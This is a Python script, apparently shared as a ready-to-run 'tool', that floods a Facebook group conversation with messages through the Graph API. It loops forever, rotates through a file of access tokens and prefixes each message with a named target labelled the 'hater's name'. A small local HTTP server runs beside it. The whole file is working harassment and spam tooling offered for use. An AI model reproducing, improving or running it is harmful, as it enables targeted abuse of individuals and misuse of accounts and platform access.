import requests
import time
import sys
from platform import system
import os
import http.server
import socketserver
import threading  
BOLD = '\033[1m'
CYAN = '\033[96m'
logo =("""\x1b[1;36m
  WELCOME TO TOOL    
  
  
  


\033[1;34m ════════════════════════════════════════════════════════════
 \033[1;34m
\033[1;35m  𝗔𝗨𝗧𝗛3𝗥    : \033[1;35m  ⏤ •๋𝆺꯭𝅥𝗔꯭𝘆𝘂𝘀𝗵𝗶𝗶 ཀ⎯꯭𝁂꯭꯭꯭֯-.                          
\033[1;34m 
 \033[1;33m 𝗥𝗨𝗟3𝗫     : \033[1;33mError
\033[1;34m 
 \033[1;34m 𝗚𝗜𝗧𝗛𝗨𝗕    : \033[1;34mhttps://github.com/soni563
 \033[1;34m
\033[1;31m 𝗙𝗔𝗖3𝗕0𝟬𝗞  : \033[1;35mhttps://www.facebook.com/profile.php?id=61555005910693
 \033[1;34m
\033[1;36m  𝗧𝟬𝟬𝗜𝗜 𝗡𝟵𝗠3: \033[1;36mONLINE TOOL
\033[1;34m 
 \033[1;31m 𝗪𝗛𝟵𝗧5𝟵𝟵𝗣  :\033[1;37m + ERROR
\033[1;34m 
\033[1;34m ════════════════════════════════════════════════════════════


 \033[1;34m  ═══════════════════════════════════════════════════════════
 \033[1;34m  \033[1;33m⇀TOOL RUNNING \033[1;34m  
 \033[1;34m  ═══════════════════════════════════════════════════════════

 ════════════════════════════════════════════════════════════ 
 \033[1;35m RUNNING TOOL""" )

def cls():
        if system() == 'Linux':
            os.system('clear')
        else:
            if system() == 'Windows':
                os.system('cls')
cls()
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"H")
def execute_server():
    PORT = 4000
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("Server running at http://localhost:{}".format(PORT))
        httpd.serve_forever()
def get_access_tokens(token_file):
    with open(token_file, 'r') as file:
        return [token.strip() for token in file]
def send_messages(convo_id, tokens, messages, haters_name, speed):
    headers = {
        'Content-type': 'application/json',
    }
    num_tokens = len(tokens)
    num_messages = len(messages)
    max_tokens = min(num_tokens, num_messages)
    while True:
        try:
            for message_index in range(num_messages):
                token_index = message_index % max_tokens
                access_token = tokens[token_index]
                message = messages[message_index].strip()
                url = "https://graph.FACEBOOK.com/v17.0/{}/".format('t_' + convo_id)
                parameters = {'access_token': access_token, 'message': f'{haters_name} {message}'}
                response = requests.post(url, json=parameters, headers=headers)
                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    print("\033[1;34m[√]  ⏤ •๋𝆺꯭𝅥𝗔꯭𝘆𝘂𝘀𝗵𝗶𝗶 ཀ⎯꯭𝁂꯭꯭꯭֯-.    {} of Convo\033[1;35m {} \033[1;31msent by Token {}: \n\033[1;35m{}".format(
                        message_index + 1, convo_id, token_index + 1, f'{haters_name} {message}'))
                    print("\033[1;34m  - Time: {}".format(current_time))
                else:
                    print("\033[1;35m[x] FAILED SENT MESSAGES   {} of Convo \033[1;34m{} with Token \033[1;35m{}: \n\033[1;33m{}".format(
                        message_index + 1, convo_id, token_index + 1, f'{haters_name} {message}'))
                    print(" \033[1;34m - Time: {}".format(current_time))
                time.sleep(speed)   
            print("\n\033[1;32m[+] All messages sent. Restarting the process...\n")
        except Exception as e:
            print("\033[1;31m[!] An error occurred: {}".format(e))
def main():	
    print(logo)
    
    
    
    print(' \033[1;33m [•] | Tok3n File :')
    token_file = input(BOLD + CYAN + "=>").strip()
    tokens = get_access_tokens(token_file)
    print(' \033[1;35m[•] Group Uid : ')
    convo_id = input(BOLD + CYAN + "=>").strip()
    print(' \033[1;34m[•] NP File :')
    messages_file = input(BOLD + CYAN + "=> ").strip()
    print(' \033[1;31m[•] Hat3r Name  :')
    haters_name = input(BOLD + CYAN + "=> ").strip()
    print(' \033[1;35m[•] Delay ( in Seconds :' )
    speed = int(input(BOLD + CYAN + "====> ").strip())
    with open(messages_file, 'r') as file:
        messages = file.readlines()
    server_thread = threading.Thread(target=execute_server)
    server_thread.start()
    send_messages(convo_id, tokens, messages, haters_name, speed)
if __name__ == '__main__':
    main()
